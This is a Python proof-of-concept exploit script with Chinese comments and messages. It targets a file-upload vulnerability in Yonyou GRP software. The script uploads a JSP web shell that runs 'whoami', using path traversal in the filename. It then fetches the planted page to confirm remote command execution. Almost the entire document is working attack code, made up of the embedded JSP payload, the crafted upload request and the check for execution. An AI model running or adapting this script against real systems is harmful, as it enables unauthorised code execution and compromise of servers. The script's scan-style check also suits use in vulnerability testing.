import requests
import sys
import re

#上传的文件只做当前的用户的验证
b='''<% {java.io.InputStream in = Runtime.getRuntime().exec("whoami").getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println("whoami:"+new String(b));}out.print("</pre>");} %>'''

proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}

header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
         'Connection': 'close'}
file = {"file": ('asd.jsp',b)}

def poc(host):
    try:
        target = "{u}/UploadFileData?action=upload_file&filename=../.hello.jsp".format(u=host)
        r = requests.post(url=target, headers=header, files=file, verify=False, timeout=30)
        if "showSucceedMsg" in r.text:
            target1 = "{u}/R9iPortal/.hello.jsp".format(u=host)
            r1 = requests.get(url=target1, verify=False, timeout=15)
            if r1.status_code == 200 and "whoami" in r1.text:
                a = r1.text.replace("whoami:", "").replace("\000", "").replace("<pre>", "")
                whoami = re.search(r'(.*?)\n', a, re.S).group(0)
                print(host+" 存在用友GRP文件上传漏洞！")
                print("上传文件路径："+target1)
                print("执行命令 ==> whoami: " + whoami)
            else:
                print(host + "\t" + "漏洞不存在")
                pass
        else:
            print(host + "\t" + "上传失败")
    except Exception as e:
        print(e)


if __name__ == '__main__':
    host = sys.argv[1]
    poc(host)
